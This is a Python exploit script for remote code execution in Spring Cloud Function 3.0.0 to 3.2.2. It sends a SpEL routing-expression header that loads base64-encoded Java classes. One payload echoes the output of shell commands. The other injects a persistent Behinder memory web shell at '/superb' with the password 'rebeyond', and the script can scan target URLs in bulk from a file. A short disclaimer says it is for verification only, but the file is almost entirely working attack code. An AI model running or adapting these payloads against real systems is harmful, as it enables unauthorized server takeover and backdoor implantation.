# coding:utf-8
# amazingday

import requests
import argparse
from urllib.parse import urljoin

a = '''                                                                      
                                          仅验证禁止一切违法！！！
                                          影响版本：3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2
                                          python SpringCloudFunction_rce.py -h
'''
print(a)

def Exploit(url):
    headers = {
        "spring.cloud.function.routing-expression": "T(org.springframework.cglib.core.ReflectUtils).defineClass('testEcho',T(org.springframework.util.Base64Utils).decodeFromString((T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getRequest().getParameter(\"test\"))),T(org.springframework.util.ClassUtils).getDefaultClassLoader())",
        "Accept-Cache": "whoami",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
    data = "test=yv66vgAAADQAwgoACQBjCgBkAGUKAGQAZggAZwoAaABpCABqBwBrCgAHAGwHAG0KAG4AbwgAcAgAcQgAcggAcwgASAcAdAoABwB1CAB2CABJCAB3CABKCgBuAHgIAHkIAHoKAHsAfAoAEAB9CAB%2bCgAQAH8IAEsIAIAIAIEIAIIKAIMAhAoAgwCFCgCGAIcHAIgHAIkIAIoKACUAiwoAJACMBwCNCgApAGMKACQAjgoAKQCPCACQCACRCgApAJIKAAkAkwgAlAgAlQgAlggAlwcAmAcAmQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTHRlc3RFY2hvOwEACDxjbGluaXQ%2bAQABYwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABbQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAm0xAQAEcmVzcAEAA3JlcQEACWdldEhlYWRlcgEACXNldEhlYWRlcgEACWdldFdyaXRlcgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbW1hbmRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAGd3JpdGVyAQANU3RhY2tNYXBUYWJsZQcAawcAmgcAbQcAdAcATgcAmwcAiAcAjQcAmAEAClNvdXJjZUZpbGUBAA10ZXN0RWNoby5qYXZhDAA3ADgHAJwMAJ0AngwAnwCgAQA8b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9sZGVyBwChDACiAKMBABRnZXRSZXF1ZXN0QXR0cmlidXRlcwEAD2phdmEvbGFuZy9DbGFzcwwApAClAQAQamF2YS9sYW5nL09iamVjdAcAmgwApgCnAQBAb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlNlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwEAC2dldFJlc3BvbnNlAQAKZ2V0UmVxdWVzdAEAJWphdmF4LnNlcnZsZXQuaHR0cC5IdHRwU2VydmxldFJlcXVlc3QBABBqYXZhL2xhbmcvU3RyaW5nDACoAKUBACZqYXZheC5zZXJ2bGV0Lmh0dHAuSHR0cFNlcnZsZXRSZXNwb25zZQEAHWphdmF4LnNlcnZsZXQuU2VydmxldFJlc3BvbnNlDACpAKoBAAxBY2NlcHQtQ2FjaGUBAAdvcy5uYW1lBwCrDACsAK0MAK4ArwEAA1dJTgwAsACxAQACL2MBAAcvYmluL3NoAQACLWMHALIMALMAtAwAtQC2BwC3DAC4ALkBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgEAA0dCSwwANwC6DAA3ALsBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAvACvDAC9AL4BAAEKAQAMQ29udGVudC1hdXRoDAC/AK8MAMAAwQEAB3ByaW50bG4BADplcnJvcixUaGlzIGFwcGxpY2F0aW9uIGhhcyBubyBleHBsaWNpdCBtYXBwaW5nIGZvciAvZXJyb3IuAQAFZmx1c2gBAAVjbG9zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAh0ZXN0RWNobwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwAhADYACQAAAAAAAgABADcAOAABADkAAAAvAAEAAQAAAAUqtwABsQAAAAIAOgAAAAYAAQAAAAUAOwAAAAwAAQAAAAUAPAA9AAAACAA%2bADgAAQA5AAADmQAGABAAAAHQuAACtgADEgS2AAVLKhIGA70AB7YACEwrAQO9AAm2AApNuAACtgADEgu2AAVLKhIMA70AB7YACEwqEg0DvQAHtgAITissA70ACbYACjoELSwDvQAJtgAKOgW4AAK2AAMSDrYABRIPBL0AB1kDEhBTtgAROga4AAK2AAMSErYABRITBb0AB1kDEhBTWQQSEFO2ABE6B7gAArYAAxIUtgAFEhUDvQAHtgAROggZCAS2ABYZBwS2ABYZBgS2ABYZBhkFBL0ACVkDEhdTtgAKwAAQOgkGvQAQOgoSGLgAGbYAGhIbtgAcmQASGQoDEh1TGQoEEh5TpwAPGQoDEh9TGQoEEiBTGQoFGQlTuAAhGQq2ACK2ACM6C7sAJFm7ACVZGQsSJrcAJ7cAKDoMAToNuwApWbcAKjoOGQy2ACtZOg3GABYZDhkNtgAsVxkOEi22ACxXp//lGQcZBAW9AAlZAxIuU1kEGQ62AC9TtgAKVxkIGQQDvQAJtgAKOg8ZD7YAMBIxBL0AB1kDEhBTtgARGQ8EvQAJWQMSMlO2AApXGQ%2b2ADASMwO9AAe2ABEZDwO9AAm2AApXGQ%2b2ADASNAO9AAe2ABEZDwO9AAm2AApXpwAES7EAAQAAAcsBzgA1AAMAOgAAAJYAJQAAAAgADAAJABcACgAhAAsALQAMADgADQBDAA4ATgAPAFkAEAB0ABEAlAASAKoAEwCwABQAtgAVALwAFgDRABcA1wAYAOcAGQDtABoA9gAcAPwAHQECAB8BCAAgARUAIQEpACIBLAAjATUAJAFAACUBSAAmAVMAKAFsACkBeQAqAZsAKwGzACwBywAwAc4ALgHPADEAOwAAAKIAEAAMAb8APwBAAAAAFwG0AEEAQgABACEBqgBDAEQAAgBDAYgARQBCAAMATgF9AEYARAAEAFkBcgBHAEQABQB0AVcASABCAAYAlAE3AEkAQgAHAKoBIQBKAEIACADRAPoASwBMAAkA1wD0AE0ATgAKARUAtgBPAFAACwEpAKIAUQBSAAwBLACfAFMATAANATUAlgBUAFUADgF5AFIAVgBEAA8AVwAAAGsABv8A9gALBwBYBwBZBwBaBwBZBwBaBwBaBwBZBwBZBwBZBwBbBwBcAAAL/wAyAA8HAFgHAFkHAFoHAFkHAFoHAFoHAFkHAFkHAFkHAFsHAFwHAF0HAF4HAFsHAF8AAB3/AHoAAAABBwBgAAABAGEAAAACAGI="

    try:
        url = url + "functionRouter"
        req = requests.post(url=url, timeout=3)
        text = req.text
        rsp = "Internal Server Error"

        if req.status_code == 500 and rsp in text:
            print(url + '存在接口')
        res = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False)
        if res.headers.get("Content-auth"):
            print("Exist！Find echo")
            print(res.headers.get("Content-auth"))
        else:
            print("No Find echo，请手动确认接口是否存在漏洞")
    except Exception as e:
        print(e)
        pass

def Inject(url):
    headers = {
        "spring.cloud.function.routing-expression": "T(org.springframework.cglib.core.ReflectUtils).defineClass('injectSuper',T(org.springframework.util.Base64Utils).decodeFromString((T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getRequest().getParameter(\"test\"))),T(org.springframework.util.ClassUtils).getDefaultClassLoader())",
        "Accept-Cache": "whoami",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
    data = "test=yv66vgAAADQBBQoAQwCCCACDCQAXAIQKAEMAhQoAQwCGCgCHAIgHAIkKAAcAigoABwCLCwCMAI0LAIwAjggAjwoAOACQCACRCgCSAJMLAJQAlQgAlgoAlwCYBwCZCgA4AJoKABMAmwoAlwCcBwCdCgBDAJ4KABcAggsAjACfCgCgAKEHAKIKABwAhQoAHACjCgCXAKQKABcApQcApgoAIQCFCABmCwCnAKgIAGIIAGQKADIAqQoAkgCQBwCqCACrCwCsAK0HAK4HAK8LACwAsAgAsQoAMgCyCACzBwC0CgAyALUKALYAtwgAVwoAMgC4BwC5BwC6CAC7CgA3ALwHAL0HAL4KADsAvwcAwAoAPgDBCABSCgAXAMIKAC0AwwcAxAEAAWsBABJMamF2YS9sYW5nL1N0cmluZzsBAA1Db25zdGFudFZhbHVlAQAGPGluaXQ%2bAQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADUxpbmplY3RTdXBlcjsBAAFjAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABBNZXRob2RQYXJhbWV0ZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQADYWFhAQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAR0ZXN0AQADKClWAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQACaW4BAAZiYXNlNjQBAA1ieXRlc0VuY3J5cHRlAQANYnl0ZXNkZWNyeXB0ZQEACG5ld0NsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAtwYWdlQ29udGV4dAEAD0xqYXZhL3V0aWwvTWFwOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQA1TGphdmEvdXRpbC9NYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7PjsBAA1TdGFja01hcFRhYmxlBwDFBwDGBwDHBwCqAQAKRXhjZXB0aW9ucwcAyAEACDxjbGluaXQ%2bAQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBABVtYXBwaW5nSGFuZGxlck1hcHBpbmcBAFRMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZzsBAAZtZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB21ldGhvZDIBAAN1cmwBAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBAAJtcwEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABJpbmplY3RUb0NvbnRyb2xsZXIBAApTb3VyY2VGaWxlAQAQaW5qZWN0U3VwZXIuamF2YQwARwBIAQAQZTQ1ZTMyOWZlYjVkOTI1YgwARABFDABHAFgMAMkAygcAywwAzADNAQBAb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1NlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwwAzgDPDADQANEHAMUMANIA0wwA1ADVAQAEUE9TVAwA1gDXAQABdQcA2AwA2QDaBwDHDADbANwBAANBRVMHAN0MAN4A3wEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAOAA4QwARwDiDADjAOQBAAtpbmplY3RTdXBlcgwA5QDmDADnAOgHAOkMAOoA1QEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAOsA7AwA7QDuDABTAFQBABFqYXZhL3V0aWwvSGFzaE1hcAcA7wwA8ADxDADyAPMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuc2VydmxldC5EaXNwYXRjaGVyU2VydmxldC5DT05URVhUBwD0DAD1APYBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMAPcA%2bAEARG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuaGFuZGxlci5BYnN0cmFjdEhhbmRsZXJNZXRob2RNYXBwaW5nDAD5APoBABJnZXRNYXBwaW5nUmVnaXN0cnkBAA9qYXZhL2xhbmcvQ2xhc3MMAPsA/AcA/QwA/gD/DADUAPwBAEZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQAQamF2YS9sYW5nL1N0cmluZwEABy9zdXBlcmIMAEcBAAEATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb24BADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAwARwEBAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwARwECDABHAFEMAQMBBAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEACmdldFJlcXVlc3QBACkoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAqKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAlnZXRNZXRob2QBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEGphdmEvbGFuZy9PYmplY3QBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAUZ2V0U3lzdGVtQ2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZG9GaW5hbAEABihbQilbQgEADWphdmEvdXRpbC9NYXABAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXMBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQA7KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYAIQAXAEMAAAABABIARABFAAEARgAAAAIAAgAFAAEARwBIAAIASQAAAEgAAgACAAAADCortwABKhICtQADsQAAAAIASgAAAA4AAwAAADIABQAWAAsAMgBLAAAAFgACAAAADABMAE0AAAAAAAwATgBPAAEAUAAAAAUBAE4AAAABAEcAUQACAEkAAABHAAIAAgAAAAsqtwAEKhICtQADsQAAAAIASgAAAA4AAwAAADMABAAWAAoAMwBLAAAAFgACAAAACwBMAE0AAAAAAAsAUgBFAAEAUAAAAAUBAFIAAAABAFMAVAACAEkAAAA9AAQAAgAAAAkqKwMrvrcABbAAAAACAEoAAAAGAAEAAAA2AEsAAAAWAAIAAAAJAEwATQAAAAAACQBVAFYAAQBQAAAABQEAVQAAAAEAVwBYAAIASQAAAdkABgALAAAA0LgABsAAB8AAB7YACEy4AAbAAAfAAAe2AAlNK7kACgEATiu5AAsBABIMtgANmQCeLRIOKrYAD1cSArkAEAMAEhG4ABI6BBkEBbsAE1kqtgAPVxICtgAUEhG3ABW2ABa7ABdZuAAYtwAZOgUruQAaAQC2ABs6BrsAHFm3AB0ZBrYAHjoHGQQZB7YAHzoIGQUZCLYAIDoJuwAhWbcAIjoKGQoSIy25ACQDAFcZChIlK7kAJAMAVxkKEiYsuQAkAwBXGQm2ACcZCrYAKFenAAU6BLEAAQAhAMoAzQApAAQASgAAAE4AEwAAADwADQA9ABoAPgAhAEIALwBDAD4ARABFAEUAXgBGAGoARwB1AEgAgwBJAIwASgCVAEsAngBMAKkATQC0AE4AvwBPAMoAUwDPAFQASwAAAHAACwBFAIUATgBZAAQAagBgAFoATQAFAHUAVQBbAEUABgCDAEcAXABWAAcAjAA%2bAF0AVgAIAJUANQBeAF8ACQCeACwAYABhAAoAAADQAEwATQAAAA0AwwBiAGMAAQAaALYAZABlAAIAIQCvAGYAZwADAGgAAAAMAAEAngAsAGAAaQAKAGoAAAATAAP%2bAMoHAGsHAGwHAG1CBwBuAQBvAAAABAABAHAACABxAFgAAQBJAAABPAAJAAgAAACFuAAGEioDuQArAwDAACxLKhItuQAuAgDAAC1MEi%2b4ADASMQO9ADK2ADNNLAS2ADQSFxI1A70AMrYANk67ADdZBL0AOFkDEjlTtwA6OgS7ADtZA70APLcAPToFuwA%2bWRkEGQUBAQEBAbcAPzoGuwAXWRJAtwBBOgcrGQYZBy22AEKnAARLsQABAAAAgACDACkAAwBKAAAANgANAAAAHAAPAB0AGwAeACoAHwAvACEAOwAjAE0AJQBaACcAbAApAHcAKwCAAC8AgwAtAIQAMABLAAAAUgAIAA8AcQByAHMAAAAbAGUAdAB1AAEAKgBWAHYAdwACADsARQB4AHcAAwBNADMAeQB6AAQAWgAmAHsAfAAFAGwAFAB9AH4ABgB3AAkAfwBNAAcAagAAAAkAAvcAgwcAbgAAAQCAAAAAAgCB"

    try:
        posturl = url + "functionRouter"
        requests.post(posturl, headers=headers, data=data, timeout=10, allow_redirects=False, verify=False)
        checkurl = url + "superb"
        checkres = requests.get(checkurl, data=data, timeout=10, allow_redirects=False, verify=False)
        if checkres.status_code == 500:
            print("Inject Behinder！pass:rebeyond")
            print(checkurl)
        if checkres.status_code ==404:
            print("No Inject")
    except Exception as e:
        print(e)
        pass

def main():
    parser = argparse.ArgumentParser(description='Srping_Cloud_Function_Rce')
    parser.add_argument('-file', help='url file', required=False)
    parser.add_argument('-url', help='target url', required=False)
    parser.add_argument('-inject', help='inject behinder shell', required=False, action='store_true')
    args = parser.parse_args()
    if args.url:
        if args.inject:
            Inject(args.url)
        else:
            Exploit(args.url)
    if args.file:
        with open(args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)


if __name__ == '__main__':
    main()
